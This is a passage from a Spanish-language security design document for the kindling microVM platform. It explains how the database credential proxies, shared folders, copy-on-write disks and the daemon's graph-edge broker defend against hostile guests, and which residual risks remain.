    (sin TOCTOU). Al entregar, el daemon cruza además el puerto con los reenvíos vivos.
    Se eligió un rango y no otra IP de loopback (`127.0.0.2`) porque macOS solo
    configura `127.0.0.1` y dar de alta otra exige root en cada arranque. En Linux no
    hay reenvíos al loopback (al invitado se llega por `172.30.0.0/16`, prohibida; los
    DNAT de cada netns no tocan el tráfico que origina el host; la API del daemon es un
    socket Unix); lo único de kindling que puede escuchar ahí es opcional y HTTP con
    token (gateway MCP o `kling ai up` en `127.0.0.1:8080`), y el proxy no da al
    invitado ni un byte de una conexión cuyo servidor no haya completado SCRAM o TLS
    verificado.
  - **`-upstream-tls disable`, solo con `-upstream`.** Sin `SSLRequest` y sin TLS, y
    entonces **solo** SCRAM-SHA-256: ni `-PLUS` (necesita TLS), ni contraseña en claro,
    ni md5, ni un `AuthenticationOk` sin SCRAM (trust). La contraseña no cruza la red
    (SCRAM prueba que se conoce sin mandarla, y el servidor tiene que probar lo mismo
    con su firma), pero **las consultas y sus resultados sí van en claro** entre el
    proxy y el servidor: para un Docker en el loopback no salen del host; hacia la LAN,
    la CLI lo advierte. Un intermediario en esa red no se lleva la clave, pero puede leer
    y cambiar lo que pasa después de autenticar: para la LAN, mejor TLS con `-ca-file`.
    Un `kling-vz` que no anuncie `postgres-upstream` en `credential_kinds` no recibe
    credenciales que usen estos campos (marcaría el dominio en su lugar).
  - **Upstream que es otra máquina: el modelo A de `kling db`** (`kling db attach`,
    `upstream_machine`, `pkg/credproxy/maquina.go`, `internal/machine/copias_db.go`).
    Una copia de base de datos compartida por agentes de otras microVMs, cada uno por su
    proxy y con su marcador; la contraseña (la de la copia o, mejor, la de un rol de
    `kling db role`; nunca la del golden, que la copia rotó al nacer) se entrega como
    cualquier credencial del agente, cifrada con su id como dato autenticado. Lo que se
    guarda **no es una dirección sino el id de la copia** y el dueño que declara quien la
    entrega: un índice de red se reutiliza en cuanto la copia se para o se borra, y una
    dirección fijada al entregar llevaría la clave y el SQL del agente al invitado de
    otro (TOCTOU). La dirección se pide al daemon **en cada conexión** (y en cada
    `CancelRequest`), que bajo el candado del manager exige que la máquina con ese id
    exacto exista, corra, sea una copia de `kling db` en `ready`, exponga el puerto en
    `kling.ports` y que la copia, el agente y la credencial digan el mismo
    `kling.db.owner`; si algo no cuadra, no se marca. Esa dirección (la IP del netns de
    la copia, en `172.30.0.0/16`) es la **única** excepción a los destinos prohibidos, y
    ni la API ni la CLI la aceptan como texto: `upstream_machine` tiene que ser un id
    hexadecimal (una IP o `host:puerto` no casan), y aun resuelta se comprueba que sea
    una dirección de kindling y nada más (ni la LAN ni el loopback fuera del rango de
    reenvíos). Obliga a `upstream_tls disable` y por tanto a SCRAM-SHA-256: la copia
    tiene que probar que conoce la clave, así que ni un error de resolución llevaría la
    contraseña a otro. **Las sesiones vivas se cortan** (las dos mitades) al congelar,
    pausar, parar, borrar o marcar fallida la copia, al cambiar sus etiquetas de
    `kling db` o las del agente, y al retirar o cambiar la credencial (`kling db detach`,
    `DELETE /machines/{ref}/credentials/{env}`); la sesión se registra antes de
    resolver, así que una invalidación que llegue entre la resolución y el dial también
    la para. No se admite en credenciales de plantilla, y un agente con attach no se
    ramifica (guardián de fork). **En macOS** el proxy vive en el `kling-vz` del agente,
    que no conoce a las demás máquinas y **no recibe nunca una dirección**: pide cada
    conexión al broker de enlaces del daemon, que hace las mismas comprobaciones, marca
    él mismo al reenvío de la copia y le entrega el socket ya conectado (ver §15, "En
    macOS"). El dueño (`kling.db.owner`) es una etiqueta: la frontera sigue siendo el
    daemon. Sin política de autorización, quien tiene su socket puede reetiquetar
    máquinas; con ella ([docs/authz.md](docs/authz.md)) un inquilino solo puede poner su
    propio nombre en `kling.db.owner`, solo apunta `upstream_machine` a máquinas suyas, y
    el proxy exige además el mismo `kling.owner` (el inquilino, que pone el daemon) en
    copia y agente.
  - **El invitado no ve la autenticación de verdad.** Recibe `AuthenticationOk` solo
    tras el del servidor; un error del servidor antes de eso no se reenvía (recibe uno
    propio, 28P01 u 08006, como mucho con el SQLSTATE del servidor) y el log del host solo
    lleva ese código. Después el flujo pasa tal cual en los dos sentidos: **no se
    sustituye nada en él**, ni el marcador ni la clave. La excepción es
    `BackendKeyData`: la clave de cancelación se cambia por una aleatoria, y un
    `CancelRequest` con ella se traduce a la real en una conexión nueva al mismo destino
    y con el mismo modo TLS;
    uno con una clave que el proxy no dio se cierra sin más. Con el protocolo 3.2
    (PostgreSQL 18) la clave es de longitud variable: la falsa tiene la longitud de la
    versión del invitado (4 bytes en 3.0, 32 en 3.2) y la real se guarda tal cual la da
    el servidor, que tiene que ser de SU versión (4 bytes en 3.0, 4-256 en 3.2); un
    segundo `BackendKeyData` o una clave de otra longitud cortan la conexión antes de
    que el invitado reciba nada. Un `NegotiateProtocolVersion` del servidor solo vale
    como primer mensaje, una vez, a una versión menor más baja que la pedida y sin
    opciones rechazadas (el proxy no manda ninguna); cualquier otro es un fallo de
    autenticación. Un `CancelRequest` con una clave de más de 256 bytes se rechaza como
    arranque mal formado.
  - **Límites**: 32 conexiones a la vez por máquina, 10 s para que el invitado mande
    arranque y contraseña y 15 s para toda la autenticación; tras ella no hay plazo de
    inactividad (un pool puede estar horas callado), hay keepalive TCP de 30 s.
  - **Registro**: una línea por conexión (`kind: postgres`) con dominio, rol, base de
    datos, el upstream fijado si lo hay (`upstream`, configuración del operador), método
    con que se autenticó el proxy (`auth`: `scram-sha-256(-plus)`, o `password` si el servidor
    pidió la contraseña en claro dentro de TLS, con un aviso en el log del host una vez por
    credencial), motivo si no llegó, bytes y duración. Nunca la clave, el marcador ni el SQL.
  - **Cómo llega el invitado**: en Linux un DNAT lleva cualquier puerto TCP de la IP del
    proxy que no sea el 53, el 80 ni el 443 a `n.HostIP:5381` (con su FORWARD e INPUT),
    así que el cliente usa el puerto de su cadena de conexión. En macOS, `kling-vz` atiende
    en la pasarela cualquier puerto salvo el 53 y el 80, pero solo en allowlist y con
    alguna credencial Postgres; si no, se rechaza como antes. El daemon pregunta a
    `kling-vz` qué tipos entiende (`credential_kinds` en `/kling/info`) y no le manda
    una credencial Postgres si no dice `postgres`: uno anterior la serviría como HTTP.
  - La clave tiene que ser ASCII imprimible (SASLprep es la identidad para eso).
- **Proxy de credenciales de MySQL y MariaDB** (`kling machine credential -type mysql`,
  `pkg/credproxy/mysql.go`, sin publicar; ver [docs/mysql.md](docs/mysql.md)). El
  modelo y las barreras de Postgres (dialer de solo IPs públicas, `-upstream` con los
  mismos destinos prohibidos y el rango de reenvíos, TLS 1.2+ verify-full, límites de
  conexiones y plazos, registro por conexión con `kind: mysql`), con estas diferencias:
  - **El saludo es del proxy.** En MySQL habla primero el servidor: el proxy manda el
    suyo (versión propia, id de conexión 0, nonce de `crypto/rand`, sin `CLIENT_SSL`,
    sin compresión, sin `LOCAL INFILE`, sin atributos de conexión). El invitado prueba
    el marcador con `mysql_native_password` o la ruta rápida de `caching_sha2_password`
    (cualquier otro método recibe un `AuthSwitchRequest` a native con el mismo nonce);
    el proxy calcula la prueba de **todos** los marcadores MySQL y compara en tiempo
    constante. Después, el usuario de la credencial y, si la fija, la base de arranque.
  - **Hacia el servidor**, el saludo se lee con su longitud exacta y sin buffer, y el
    TLS empieza tras el `SSLRequest`: lo que un intermediario inyecte tras el saludo
    cae dentro del handshake. Un servidor sin `CLIENT_SSL` es un fallo. La clave va por
    `caching_sha2_password` (si el servidor pide la autenticación completa, en claro
    dentro del TLS verificado) o `mysql_native_password`; `mysql_clear_password`, solo
    dentro del TLS; nada más.
  - **`-upstream-tls disable`** (solo con `-upstream`) admite solo lo que no manda la
    clave (native y la ruta rápida). **Es más débil que en Postgres**: MySQL no tiene
    nada como la firma del servidor de SCRAM, así que el servidor no prueba que conoce
    la clave; quien conteste en la dirección fijada se queda con las consultas y con un
    scramble (atacable por diccionario si la clave fuera débil). El intercambio RSA con
    la clave pública del propio servidor no se implementa: no lo autentica.
  - **Capacidades**: se empalman bytes, así que el servidor tiene que tener las que
    cambian el formato y eligió el invitado; si no, error propio antes de mandar la clave.
  - **Errores**: nada del servidor llega al invitado antes del OK (recibe 1045 o 2003
    propios, como mucho con el código numérico del servidor).
  - **`KILL QUERY` no se mapea** (exigiría reescribir SQL): con el id del saludo (0) no
    cancela nada; con el de `CONNECTION_ID()`, por el proxy, sí.
  - **La base no es una frontera** en MySQL (`USE otra`): lo es el `GRANT` del usuario.
  - **A qué puerto**: con credenciales de los dos tipos en una máquina, MySQL es el 3306
    y ninguna Postgres puede usarlo (en Linux, un DNAT propio del 3306 a
    `n.HostIP:5382`, con su FORWARD e INPUT; en macOS, `kling-vz` ve el puerto). El
    daemon no manda una credencial MySQL a un `kling-vz` que no anuncie `mysql`.
  - `kling db attach` (upstream que es otra máquina) no se admite con MySQL: sin prueba
    del servidor, una resolución equivocada llevaría el scramble a otro invitado.

### 8. Ejecutar comandos dentro es opt-in y se decide al arrancar

`kling exec`, `kling cp` y los sandboxes ejecutan y escriben dentro de una microVM.
Solo existen en máquinas creadas con `allow_exec`, que viaja en la línea de comandos
del kernel: la escribe el host, el invitado no puede concedérsela, y sin ella las
rutas `/exec` y `/files` del agente no están registradas. Se congela con la memoria,
así que un snapshot de servicio (sin ella) nunca da máquinas que ejecuten, y el
daemon se niega a crear un sandbox desde él. El daemon no se fía del flujo del
agente: recorta la salida a los topes y valida cada evento. Los sandboxes nacen sin
red y se destruyen al vencer su TTL.

Los **grafos precalentados** del frontal de sandboxes (`ext/sandbox`, #57) se reparten
entre inquilinos con las mismas reglas que las máquinas precalentadas: un grafo es de un
inquilino solo si TODAS sus máquinas llevan su etiqueta `tenant` (y el `kling.graph` de
ese grafo, que pone el daemon y nadie cambia); uno mezclado por dos reclamaciones a la
vez no es de nadie, no se entrega y se borra. Sus nodos admiten `exec`, ficheros y shell
del dueño del grafo entero, nada más. Una plantilla de grafo no puede llevar aristas
`credential` (la clave viajaría con la plantilla), ni volúmenes o carpetas del host en
sus nodos (serían los mismos en todas las instancias, un canal entre inquilinos), ni
nodos `lazy` (nacerían sin la etiqueta de su dueño).

Con la autorización del daemon activa ([`docs/authz.md`](docs/authz.md)), el frontal y el
fondo de `ext/sandbox` necesitan la identidad `admin`: guardan y leen plantillas en
`/store` y reparten con `SetLabels` (`PUT /machines/{ref}/labels`) máquinas y grafos que
no son de ningún inquilino del daemon.

### 9. Snapshots firmados

Cada snapshot dorado lleva un HMAC-SHA256, con una clave que solo existe en su
host y solo lee root (`$KLING_ROOT/secrets/snapshot.key`), sobre los hashes de sus
ficheros y la política con la que nacen las instancias: exec, red, dominios
permitidos y volúmenes. Los sha256 solos detectaban corrupción; la firma detecta
además manipulación —cambiar el overlay y su hash a la vez, o encender exec en el
`meta.json`— y snapshots traídos de otro host. Los anteriores a esto no llevan
firma y se aceptan, salvo con `KLING_REQUIRE_SIGNED=1`.

### 10. El proxy al invitado solo llega al puerto del agente

`POST /machines/{ref}/guest` solo alcanza el puerto 8080 del invitado, salvo los
que la máquina declare en su etiqueta `kling.ports`. Antes llegaba a cualquier
puerto, y con él a servicios internos de la microVM que nadie había decidido
exponer.

### 11. Jailer obligatorio por defecto en Linux

En Linux, `kling run`/`kling daemon` **se niegan a arrancar una máquina nueva** si no
encuentran el binario `jailer` y el usuario de servicio sin privilegios (con el grupo
`kvm`) listos, en vez de arrancar sin jailer en silencio como hacía antes. El mensaje de
error dice exactamente qué falta y cómo arreglarlo
(`scripts/20-install-firecracker.sh`, o crear el usuario/grupo). `KLING_JAILER=0` sigue
existiendo como salida explícita — el daemon avisa **una vez, en el log de arranque**
("SECURITY WARNING") cuando se usa — y `KLING_JAILER=1` fuerza jailer y da un error claro
si falta el binario en vez de un fallo de `exec` críptico. La decisión se toma una vez por
proceso al arrancar el daemon: instalar jailer o crear el usuario con el daemon ya en
marcha no lo destraba hasta reiniciarlo. Solo afecta a arranques **nuevos**
(`run`, restaurar un snapshot, `thaw`); una máquina ya en marcha, en pausa o congelada no
se ve afectada, ni tampoco los comandos de solo lectura (`ps`, `logs`, …). macOS/`kling-vz`
no usa jailer y no se ve afectado por nada de esto.

### 12. Admisión por disco y por presión de memoria

El daemon rechaza máquinas nuevas cuando queda poco disco bajo `$KLING_ROOT` o
cuando el host está bajo presión de memoria según PSI, antes de arrancarlas. Un
invitado no puede llenar el disco del host a base de que se creen máquinas.

### 13. Carpetas compartidas: el host sirve, el invitado es hostil

`kling run -share` mete un directorio del host dentro de una microVM (diseño en
[docs/compartir.md](docs/compartir.md)). Dos modos, dos superficies:

- **copy** no abre nada nuevo: el daemon valida un tar (solo directorios,
  ficheros regulares y enlaces relativos que no salen del árbol ni atraviesan
  otros enlaces; ni rutas absolutas, ni `..`, ni enlaces duros, dispositivos o
  FIFOs; tamaño y número de entradas acotados), lo extrae en un directorio
  privado, construye un ext4 y lo engancha de SOLO LECTURA al VMM, como un volumen
  compartido.
- **ro/rw** sirve un directorio del host en vivo. El kernel del invitado habla
  FUSE con el agente, y el agente pide operaciones por ruta al daemon. El agente
  corre dentro, así que la frontera es el daemon (`internal/share`):
  - Solo se sirve lo que el operador permitió: `daemon.share_roots` vacío (el
    defecto) desactiva las carpetas vivas; la ruta se compara resuelta, y nunca
    una que contenga la raíz de datos de kindling.
  - Todo acceso al disco va por `os.Root` (`openat`): ni `..` ni un enlace
    simbólico sacan una operación de la carpeta. Unlink, rmdir, rename y readlink
    trabajan con `*at` sobre el directorio padre abierto por `os.Root`, sin seguir
    el último componente; `open` exige que lo abierto sea un fichero regular. Los
    enlaces del host se leen, pero el host no los sigue nunca: los resuelve el
    kernel del invitado dentro de su propio árbol.
  - Dispositivos, FIFOs y sockets del host no existen para el invitado. SYMLINK,
    LINK y MKNOD se rechazan: un enlace plantado por el invitado sería un arma
    contra lo que el host haga luego con esa carpeta.
  - Cada campo se valida: rutas (relativas, limpias, componente ≤ 255, total ≤
    4096), tamaños (lectura y escritura ≤ 128 KiB, tramas ≤ 144 KiB), offsets,
    handles (con la época de su sesión). Por sesión, 16 operaciones en vuelo y
    1024 ficheros abiertos. Por encima de eso hay un **tope de 2048 descriptores
    por máquina** (compartido entre todas las carpetas vivas de esa misma
    máquina, así que 8 carpetas ya no llegan a 8192 entre todas) y un
    respaldo global de 16384 en todo el daemon; una máquina hostil agota su
    propio tope mucho antes de tocar el de las demás.
  - Crear un fichero dentro de la carpeta comprueba primero, con `Lstat`, que no
    exista ya como directorio, enlace simbólico, FIFO o dispositivo (antes solo
    se comprobaba en la ruta sin crear); la creación real siempre pide
    `O_EXCL`, aunque el invitado no lo haya pedido, así que no puede plantar un
    nombre y hacer que una escritura futura del host caiga en algo que no es
    un fichero regular.
  - `ro` se impone en el daemon (`EROFS`), no en el montaje del invitado.
  - Para el invitado todo es de root; no ve uid/gid del host, `chown` no hace
    nada y los modos se recortan a `0777` (sin setuid/setgid/sticky). Lo que crea
    se entrega al dueño de la carpeta.
  - `/share/attach` solo la abre el host: el agente la rechaza si viene de
    loopback o de la propia IP del invitado, y el gateway MCP no la reenvía.
  - Una máquina con carpetas no se convierte en snapshot (409).

Lo que queda: el invitado rw puede escribir cualquier cosa DENTRO de la carpeta
(incluidos ficheros que el host luego ejecute: compartir un directorio en rw es
darle esa confianza); un enlace duro que ya existiera en la carpeta hacia fuera
se sirve como el fichero que es; y el daemon, si es root, lee con sus
permisos lo que haya bajo la carpeta.

### 14. Discos copy-on-write: el almacén (XFS o Btrfs) y su bind en el jail

Con `daemon.cow` (ver [docs/cow.md](docs/cow.md)) el overlay de una instancia creada
desde un dorado puede vivir en un almacén propio con reflink (`$root/cow.xfs`, o
`$root/cow.btrfs` donde el núcleo no tiene XFS; montado por loop en `$root/cow`). Lo que
cambia:

- **El anfitrión no interpreta nada del invitado.** El XFS o el Btrfs lo crea y lo escribe solo el
  kernel del anfitrión; el invitado controla el CONTENIDO de su fichero de overlay, no
  los metadatos del sistema de ficheros que lo contiene. Es la misma superficie que un
  overlay en ext4.
- El almacén se monta `nodev,nosuid,noexec` (Btrfs además `nodiscard`), con la raíz y `m/` en 0750 root:grupo del
  VMM (como `machines/`), `bases/` en 0700 root y cada base en 0400: el VMM no puede
  escribir en la copia de la que se clonan las demás instancias.
- **Jail**: a cada VMM se le monta por bind SOLO el directorio de su propio overlay
  (`cow/m/<id>`), nunca el almacén entero. El bind se desmonta antes de borrar el jail,
  y si no se puede desmontar el jail no se borra (un `RemoveAll` a través del bind
  borraría el overlay).
- El daemon no sigue el enlace simbólico de `machines/<id>` (un directorio del VMM)
  para borrar ni para leer el overlay en `commit`: las rutas del almacén salen del id.
- **Permisos del directorio de instancia**: `cow/m/<id>` es `root:grupo-del-VMM` 0750 (el
  VMM solo lo atraviesa) y el FICHERO `overlay.ext4` es `root:grupo-del-VMM` 0660: el VMM
  lo lee y lo escribe por grupo, pero **no es dueño de nada** en el almacén. Así un
  Firecracker comprometido no crea ficheros en su directorio, no puede cambiar el overlay
  por un enlace simbólico y no puede tocar los atributos que el núcleo reserva al dueño
  (ver la cuota, abajo). `runFrom` no le hace `chown` al enlace de `machines/<id>` cuando
  apunta al almacén (el `chown` lo seguiría). Además `commit` (y con él `fork` y `graph snapshot`) abre el overlay con
  `O_NOFOLLOW`, comprueba con `Fstat` sobre el descriptor que es un fichero regular y
  **copia desde ese mismo descriptor** (FICLONE entre descriptores, o una copia dispersa en
  Go con `SEEK_DATA`/`SEEK_HOLE`), sin volver a abrir la ruta: cambiar el overlay por un
  enlace entre la comprobación y la copia no cuela otro fichero en el dorado. El destino se
  crea con `O_EXCL|O_NOFOLLOW` y se cede al VMM con `fchown` sobre el descriptor, porque en
  el jail está en un directorio del VMM; al recuperarlo del jail se exige que sea el mismo
  inodo que escribió el daemon. Si la ruta cambió de fichero durante la copia, la copia se
  descarta igualmente (el dorado no correspondería a la memoria volcada). En macOS el
  clon es `fclonefileat(2)` desde el mismo descriptor: crea el destino él mismo (falla si
  existe, enlace incluido), y el daemon lo abre relativo al directorio con `O_NOFOLLOW` y
  exige fichero regular, un solo enlace (no un hardlink a otro fichero puesto en su
  lugar), dueño el daemon (`CLONE_NOOWNERCOPY`) y el tamaño del origen.
- **Espacio**: el fichero de imagen se reserva entero al crearlo (sin sobreasignar), así
  que el sistema de ficheros no falla por falta de sitio debajo (Btrfs se formatea con
  `-K` y se monta con `nodiscard`: un discard agujerearía el fichero y perdería la
  reserva). Crecer (`kling cow grow`, solo admin) también reserva con `fallocate` antes
  de agrandar el loop y el sistema de ficheros, y solo toca el loop cuyo
  `backing_file` es la imagen del almacén. Una imagen que no monta solo se borra sola si
  es recién creada o si ningún `machines/<id>/overlay.ext4` apunta dentro del almacén, y
  nunca mientras siga montada.
- **Cuota por instancia**: el VMM escribe el fichero de overlay y un Firecracker
  comprometido podría hacerlo crecer hasta llenar el almacén compartido. Cada overlay lleva
  una cuota del núcleo igual a su tamaño lógico más una holgura: en XFS, cuota de proyecto
  (`prjquota`; un id por overlay puesto por ioctl sobre el fichero abierto con
  `O_NOFOLLOW`, límite duro con `xfs_quota`), y en Btrfs, un subvolumen por instancia con
  qgroup. El id de proyecto de XFS lo puede cambiar el DUEÑO del fichero
  (`FS_IOC_FSSETXATTR`, `inode_owner_or_capable`) y por eso el overlay no es del VMM: si lo
  fuera, podría salirse de su cuota o pasarse al proyecto de otra instancia y comerse la
  suya (`TestCuotaXFSNoLaCambiaElVMM` lo comprueba con un proceso sin privilegios: abre y
  escribe por grupo, y el ioctl da EPERM). Un `btrfs subvolume delete` que falla se
  reintenta una vez y, si sigue fallando, se avisa en el log con el comando para borrarlo a
  mano (`RemoveAll` no quita un subvolumen). La cuota se aplica antes de abrir el fichero al
  VMM y, si el almacén la impone
  y no se puede aplicar, la instancia no entra al almacén (cae a copia completa). Sin
  `xfs_quota`/`btrfs`, o con un XFS montado sin `prjquota`, no hay cuota y `kling doctor`
  lo avisa.
  Límite que queda: la cuota es una cota de crecimiento por instancia (XFS y Btrfs cuentan
  lo compartido con la base entero), no una reserva. Muchos invitados que reescriban a la
  vez todo su disco siguen pudiendo agotar el almacén compartido (ENOSPC para las demás);
  se dimensiona con `daemon.cow_store_gib`. Las instancias anteriores a la cuota no la tienen.

### 15. Grafos: cada arista es una autorización, no una red

Un grafo (ver [docs/grafos.md](docs/grafos.md)) deja que un nodo llegue a otro por
aristas declaradas. Nada de eso abre la red entre microVMs:

- **El FORWARD entre namespaces sigue cerrado.** Un nodo llega a otro por un proxy de
  enlace del daemon en el lado host de SU veth: su resolver contesta `<nodo>.graph`
  con la IP del host en ese veth y un DNAT del netns lleva ese puerto al proxy. Las
  reglas que se añaden (DNAT, ACCEPT del FORWARD, el MASQUERADE de `egress none`)
  tienen todas como destino esa IP; ningún paquete del invitado sale hacia otro netns.
  En el host, INPUT solo admite además el rango de los proxies de enlace
  (5400-5463) desde los veth.
- **La dirección no se fija ni se acepta nunca.** En cada conexión aceptada, el
  proxy pregunta al manager, que comprueba bajo su candado: la máquina de origen es la
  del nodo (ID exacto, `kling.graph` y `kling.graph.node`), el grafo tiene la arista
  (origen, destino, tipo, puerto), la máquina del destino es la que el grafo dice, lleva
  sus etiquetas y expone el puerto. Solo entonces da la IP de su netns, y aun así el
  proxy exige que sea un destino de kindling. Ni la API ni el fichero aceptan una
  dirección; el mismo diseño que el attach de Postgres (§7).
- **Ningún invitado fabrica ni cambia aristas.** Las aristas viven en el daemon
  (`store/graph/<id>.json`, que `/store` deja leer pero no escribir: 403). Las
  etiquetas `kling.graph*` las pone solo el daemon: `run`, `sandbox`, el fork de un
  sandbox y `PUT labels` las rechazan, y `commit` las quita de la plantilla.
- **DNS acotado.** El resolver de un nodo con aristas sirve solo los `*.graph` de SUS
  aristas (y de sus credenciales); cualquier otro `*.graph` es NXDOMAIN en todos los
  modos, sin reenviarse. En `egress none` todo lo demás es NXDOMAIN: se arranca un
  resolver solo para esto, que no reenvía nada a ningún sitio. En `internet`, el DNS
  del invitado pasa a reenviarse desde el host (con los mismos topes de tasa y de
  consultas en vuelo) en vez de salir directo.
- **Forks y snapshots no se cruzan.** Las aristas se resuelven por (grafo, nodo) y el
  ID del grafo va en la comprobación: una copia tiene otro ID y otras máquinas, así
  que no alcanza nunca al original ni el original a ella. El snapshot y el fork pausan
  los nodos y cortan las sesiones hacia ellos antes de volcar: ninguna sesión TCP
  sobrevive a una restauración. Los mismos marcadores de credenciales se entregan a
  cada copia (el invitado los tiene en memoria), apuntados a su propio grafo; un nodo
  con credenciales que no son de sus aristas no se ramifica. Un volumen en escritura
  (en cualquier nodo, instanciado o no) tampoco: dos escritores sobre un ext4 lo
  corrompen, así que el fork se rechaza (409) antes de pausar nada; en solo lectura se
  comparte. Los volúmenes se sueltan con el invitado en marcha antes de la pausa, como
  en `commit`: la caché de ext4 de un disco que no viaja con el volcado no entra en la
  memoria de la plantilla.
- **Las plantillas de `graph snapshot` son persistentes y llevan marcadores en su
  RAM.** A diferencia de las temporales de un fork, no se borran solas: quedan como
  plantillas normales (`<N>-<nodo>-<gen>`) hasta un `kling template rm`. El `mem.file`
  de un nodo con aristas `credential` contiene los marcadores que el invitado tenía en
  memoria (en su entorno, en la memoria de su aplicación). **No son las claves**: la
  clave nunca entra al invitado ni al volcado, y la plantilla no se lleva ni el almacén
  de credenciales del nodo ni su registro en el proxy. Un marcador solo vale en el proxy
  de la máquina a la que se entregó y mientras siga registrado ahí; una instancia creada
  con `run -from` de esa plantilla despierta con marcadores que su propio proxy no
  conoce, así que son inertes (la conexión con ellos no recibe la clave). Aun así, la
  plantilla es una foto de la memoria del invitado y se trata como tal: legible solo
  por root y el grupo del VMM (como cualquier dorado), y a borrar cuando ya no haga
  falta.
- **Tormenta acotada.** 16 conexiones a la vez por arista (la siguiente se cierra en el
  acto), un solo despertar en vuelo por nodo y 64 conexiones esperándolo como mucho;
  por encima, rechazo y una línea `busy` en la auditoría. Un despertar que no cabe
  en memoria es `no_capacity`, no un OOM.
- **Mantener despierto a un nodo exige su arista.** `idle_freeze` se renueva solo con
  las conexiones que pasan la puerta de una arista hacia ese nodo; las rechazadas no
  tocan su reloj. Un nodo sin arista no puede impedir que otro se congele; uno con ella
  sí, conectando cada menos de N segundos (es el uso que la arista autoriza, y cuesta lo
  que la memoria de ese nodo).
- **Las claves de las aristas `credential`** viajan una vez en `POST /graphs`, nunca
  salen por la API y se guardan cifradas (`<id>.secrets.enc`, AES-GCM con la clave del
  almacén de credenciales y el grafo como dato autenticado: copiadas a otro grafo no se
  abren).

- **Las carpetas de las aristas `share` son del daemon.** Viven en
  `$KLING_ROOT/graph-shares/<grafo>` (0700), fuera del almacén que lee `/store`, y se
  borran con el grafo. Se montan sin pasar por `daemon.share_roots` solo porque el
  permiso viaja en el contexto interno con el que el manager arranca ESE nodo (la ruta
  exacta de cada carpeta de sus aristas); una petición de `run` o `sandbox` con la misma
  ruta pasa por `share_roots` como cualquier otra y se rechaza. El dueño la monta `rw` y
  quien la ve, `ro` salvo que la arista diga `rw`. Un grafo con `share` no se vuelca
  (snapshot ni fork, 409), por el mismo motivo que `commit` no toma una máquina con
  `-share`.
- **`depends` no abre nada.** Solo ordena arranques y, con `port`, el daemon comprueba
  que el puerto del destino contesta: en Linux marcando desde el host a la IP de su netns
  (lo que ya hace con cualquier invitado), en macOS preguntando al `kling-vz` del
  destino por su socket de API (`GET /kling/probe`, el mismo sondeo que `exec`), sin
  abrir ningún reenvío ni dar una dirección. El 8080 del agente no vale tampoco aquí.
- **No hay arista `mcp`.** El puente MCP escucha solo en el 8080, junto al agente; una
  arista a él daría `exec` sobre el servidor. Se rechaza al validar.

Lo que queda: el tramo del proxy de enlace al destino va en claro por el host, como el
attach de Postgres (las credenciales exigen SCRAM; un `link` es TCP crudo y su
protocolo es cosa de la aplicación).

**En macOS: el broker de enlaces** (`pkg/linkbroker`, `internal/machine/broker*.go`,
`vz/internal/grafo`). Allí la red de cada invitado vive en su `kling-vz`, un proceso
confinado que no conoce a las demás máquinas, y todos los invitados se alcanzan por
reenvíos del loopback (`127.0.0.1`, rango reservado 29000-29999). Las aristas (y
`kling db attach`, arriba en §7) llegan a otra máquina así:

- **`kling-vz` pide la arista, no una dirección.** El DNS de su pila contesta los
  `<nodo>.graph` de SUS aristas con la pasarela (NXDOMAIN para cualquier otro
  `*.graph`, en todos los modos), y una conexión del invitado a la pasarela en el
  puerto de una arista `link` (o al proxy de Postgres de una `credential`) se convierte
  en una petición al daemon: `{kind: link, host: api.graph, port: 8081}` o `{kind:
  machine, machine: <id>, owner, port}`. El daemon no acepta campos que no conoce: una
  petición con una dirección se rechaza.
- **Quién pregunta lo dice el kernel, no la petición.** El broker escucha en un socket
  Unix de un directorio privado del usuario (`/tmp/kling-<uid>/`, 0700, comprobado), y
  el perfil de sandbox de `kling-vz` solo le deja conectar a ese socket. El daemon
  identifica al que llama con lo que pone el kernel al conectar: su UID
  (`LOCAL_PEERCRED`) tiene que ser el del daemon, su PID (`LOCAL_PEERPID`) tiene que ser
  un proceso cuyo ejecutable es el `kling-vz` con el que el daemon arranca las máquinas
  (`proc_pidpath`, por la llamada `proc_info`, sin cgo) y el VMM de exactamente una
  máquina; y solo resuelve aristas de ESA máquina, con
  las mismas comprobaciones que en Linux bajo su candado (`comprobarAristaLocked`,
  `comprobarCopiaLocked`). Una credencial hacia otra máquina se atiende además solo si
  está en el almacén de la máquina que pregunta.
- **El daemon marca y entrega el socket conectado** (SCM_RIGHTS), en vez de devolver
  la dirección del reenvío: entre esa respuesta y el dial de `kling-vz` el destino
  podría congelarse y otra máquina heredar su puerto (el TOCTOU que el diseño evita),
  y habría que dejar a `kling-vz` marcar a los reenvíos de otros, que `upstream.go` le
  prohíbe. Tras marcar, el daemon vuelve a mirar bajo su candado que el destino sigue
  en marcha con el mismo reenvío; si no, no entrega nada. El 8080 se rechaza también
  aquí.
- **Cortar no necesita un canal hacia `kling-vz`.** La conexión Unix de cada petición
  queda abierta como arrendamiento de la sesión, y el daemon guarda su copia del socket
  TCP: al congelar, pausar, parar o borrar el destino (o al cambiar las etiquetas de
  `kling db` del origen) hace `shutdown`, que corta los dos lados aunque `kling-vz` no colabore, y
  cierra el arrendamiento. Si el daemon se reinicia, `kling-vz` ve caer el arrendamiento
  y corta la sesión: ninguna sobrevive sin alguien que la pueda invalidar.
- **Acotado.** 16 conexiones a la vez por arista en `kling-vz`, 1024 sesiones por
  máquina de origen y 4096 conexiones al broker en el daemon; una petición tiene 5 s
  para llegar. Una conexión cuyo PID aún no es de ninguna máquina (un arranque o un
  thaw en curso) espera hasta 15 s, pero solo 64 a la vez: la siguiente se rechaza en el
  acto, y ni el UID ni el ejecutable equivocados llegan a esperar.

Lo que queda en macOS: la identidad por PID supone que el PID que el daemon apuntó es
el del `kling-vz` vivo. Si ese proceso muriera y su PID lo reciclara otro proceso del
mismo usuario antes de que el vigilante lo note, ahora solo pasaría si ese otro proceso
es también el ejecutable `kling-vz` del daemon (otro programa se rechaza por su ruta),
y un `kling-vz` recién lanzado es de otra máquina, que el daemon apunta con su propio
PID. Aun así no hay un identificador que no se recicle (el `audit_token` con su
contador de versión de PID pide `getsockopt(LOCAL_PEERTOKEN)` y compararlo con el del
proceso lanzado, que solo da libproc/cgo). Es el mismo usuario que ya puede hablar con
el socket del daemon, así que no cruza la frontera de §1. Entre el dial del daemon y la segunda comprobación hay un instante en
el que un reenvío muerto podría haberlo reabierto otra máquina; la segunda comprobación
lo detecta si el daemon ya sabe que el destino cambió.

**El puerto del agente de invitado (8080) nunca es destino de una arista.** El agente no
autentica (confía en que solo el host le habla) y sirve `exec`, ficheros y volúmenes; el
proxy de enlace marca desde el host. Una arista `link` o `credential` al 8080 se rechaza
en `ValidateGraph` y, como defensa en profundidad, en `comprobarAristaLocked` en cada
